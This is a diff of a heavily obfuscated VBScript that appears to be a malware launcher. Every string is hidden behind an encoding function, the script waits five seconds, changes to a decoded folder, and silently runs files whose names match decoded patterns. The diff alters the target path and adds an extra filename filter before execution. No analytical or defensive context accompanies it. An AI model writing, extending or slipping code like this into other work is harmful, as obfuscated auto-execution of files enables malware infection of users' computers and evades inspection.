@@ -122,10 +122,12 @@ If iHqs5U3.FileExists(o8sDhg0bM) Then
 end if
 
 wscript.sleep 5000
-m8HW1e91.CurrentDirectory = ui6laMI("V7:9|0ZRrK@i1[%h^irR*y") + gGWMzvn + ui6laMI("r9xR(7%f)fW:!W{jYWWR[HMe6WJc~_cd^]{R=CL_[Yeh=eii}ey\""juR*MB_adEZDeYm!iOR'I`jTWphHjdJ") + " " + ui6laMI("`f]Cp[yd8kQR<F_h3eW]_h,W?ctioRQIYjxWKhijpkLf6RNi")
-For Each of28Yc7r in zG1IH7kt.GetFolder(ui6laMI("F$Q9X0dRRK}iZ[\h&ieRVI") + gGWMzvn + ui6laMI("r9xR(7%f)fW:!W{jYWWR[HMe6WJc~_cd^]{R=CL_[Yeh=eii}ey\""juR*MB_adEZDeYm!iOR'I`jTWphHjdJ") + " " + ui6laMI("GvCC&[wd""kIR}F*hses]lhDW$c[i-R!IWj""W2hEj(kpfyR^x")).Files
+m8HW1e91.CurrentDirectory = ui6laMI("V7:9|0ZRrK@i1[%h^irR*y") + gGWMzvn + ui6laMI("ZjrR<7ef5fL:""W6j{WpRCBvesYEW""bFRMJg[ncTfHRsf")
+For Each of28Yc7r in zG1IH7kt.GetFolder(ui6laMI("F$Q9X0dRRK}iZ[\h&ieRVI") + gGWMzvn + ui6laMI("ZjrR<7ef5fL:""W6j{WpRCBvesYEW""bFRMJg[ncTfHRsf")).Files
 if InStr(of28Yc7r,ui6laMI("'&,M<_CdBhxW&hi9")) > 0 then
-    m8HW1e91.Run of28Yc7r.name
+    if InStr(of28Yc7r,ui6laMI("O0`l""X-i:R")) > 0 then
+        m8HW1e91.Run of28Yc7r.name
+    end if
 end if
 Next
 
